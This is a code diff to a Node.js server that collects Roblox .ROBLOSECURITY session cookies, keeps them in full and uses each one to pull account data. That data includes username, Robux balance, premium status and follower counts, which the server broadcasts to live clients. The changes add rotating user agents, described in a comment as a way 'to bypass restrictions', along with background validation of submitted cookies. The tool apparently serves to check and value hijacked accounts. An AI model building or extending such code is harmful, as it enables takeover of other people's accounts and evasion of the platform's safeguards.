@@ -48,10 +48,16 @@ function broadcast(data) {
 // Function to get user info from Roblox cookie
 async function getRobloxUserInfo(cookie) {
     try {
-        // Enhanced headers to bypass some restrictions
+        // Enhanced headers with rotating user agents to bypass restrictions
+        const userAgents = [
+            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+        ];
+        
         const headers = {
             'Cookie': `.ROBLOSECURITY=${cookie}`,
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
             'Accept': 'application/json, text/plain, */*',
             'Accept-Language': 'en-US,en;q=0.9',
             'Accept-Encoding': 'gzip, deflate, br',
@@ -64,7 +70,8 @@ async function getRobloxUserInfo(cookie) {
             'Sec-Fetch-Site': 'same-site',
             'Sec-CH-UA': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
             'Sec-CH-UA-Mobile': '?0',
-            'Sec-CH-UA-Platform': '"Windows"'
+            'Sec-CH-UA-Platform': '"Windows"',
+            'X-Requested-With': 'XMLHttpRequest'
         };
 
         // First, try to get authenticated user info
@@ -123,6 +130,42 @@ async function getRobloxUserInfo(cookie) {
             }
         }
         
+        // Check for premium status
+        let isPremium = false;
+        try {
+            const premiumResponse = await axios.get(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
+                headers: headers,
+                timeout: 5000
+            });
+            isPremium = premiumResponse.data || false;
+        } catch (e) {
+            console.log('Could not fetch premium status');
+        }
+
+        // Get follower/following count
+        let followers = 0, following = 0;
+        try {
+            const followResponse = await axios.get(`https://friends.roblox.com/v1/users/${userId}/followers/count`, {
+                headers: {
+                    'User-Agent': headers['User-Agent'],
+                    'Accept': 'application/json'
+                },
+                timeout: 5000
+            });
+            followers = followResponse.data.count || 0;
+            
+            const followingResponse = await axios.get(`https://friends.roblox.com/v1/users/${userId}/followings/count`, {
+                headers: {
+                    'User-Agent': headers['User-Agent'],
+                    'Accept': 'application/json'
+                },
+                timeout: 5000
+            });
+            following = followingResponse.data.count || 0;
+        } catch (e) {
+            console.log('Could not fetch follow counts');
+        }
+
         return {
             userId: userId,
             username: username,
@@ -130,8 +173,12 @@ async function getRobloxUserInfo(cookie) {
             description: detailsResponse.data.description || 'No description available',
             created: detailsResponse.data.created,
             robux: robux,
+            isPremium: isPremium,
+            followers: followers,
+            following: following,
             isValid: true,
             lastChecked: new Date().toISOString(),
+            addedAt: new Date().toISOString(),
             cookie: cookie.substring(0, 20) + '...' // Only show first 20 chars for security
         };
     } catch (error) {
@@ -232,24 +279,69 @@ app.post('/api/add-cookie', async (req, res) => {
         return res.status(400).json({ error: 'Cookie is required' });
     }
     
-    const cookieId = Date.now().toString();
-    const userInfo = await getRobloxUserInfo(cookie);
+    // Check if cookie already exists
+    const existingCookie = Array.from(activeCookies.values()).find(c => c.fullCookie === cookie);
+    if (existingCookie) {
+        return res.status(400).json({ error: 'Cookie already exists' });
+    }
     
-    const cookieData = {
+    const cookieId = Date.now().toString();
+    
+    // Send immediate response with loading state
+    const loadingData = {
         id: cookieId,
         fullCookie: cookie,
-        ...userInfo
+        isValid: null,
+        isLoading: true,
+        username: 'Loading...',
+        lastChecked: new Date().toISOString(),
+        addedAt: new Date().toISOString(),
+        cookie: cookie.substring(0, 20) + '...'
     };
     
-    activeCookies.set(cookieId, cookieData);
+    activeCookies.set(cookieId, loadingData);
     
-    // Broadcast new cookie to all clients
+    // Broadcast loading state immediately
     broadcast({
         type: 'cookieAdded',
-        cookie: cookieData
+        cookie: loadingData
     });
     
-    res.json({ success: true, data: cookieData });
+    // Fetch user info in background
+    setTimeout(async () => {
+        const userInfo = await getRobloxUserInfo(cookie);
+        const cookieData = {
+            id: cookieId,
+            fullCookie: cookie,
+            ...userInfo,
+            isLoading: false
+        };
+        
+        activeCookies.set(cookieId, cookieData);
+        
+        // Broadcast updated cookie data
+        broadcast({
+            type: 'cookieUpdate',
+            cookie: cookieData
+        });
+        
+        // Send notification for new valid cookie
+        if (cookieData.isValid) {
+            broadcast({
+                type: 'notification',
+                message: `✅ New cookie added: ${cookieData.username}`,
+                level: 'success'
+            });
+        } else {
+            broadcast({
+                type: 'notification',
+                message: `❌ Failed to add cookie: ${cookieData.error}`,
+                level: 'error'
+            });
+        }
+    }, 100);
+    
+    res.json({ success: true, data: loadingData });
 });
 
 app.post('/api/refresh-cookie/:id', async (req, res) => {
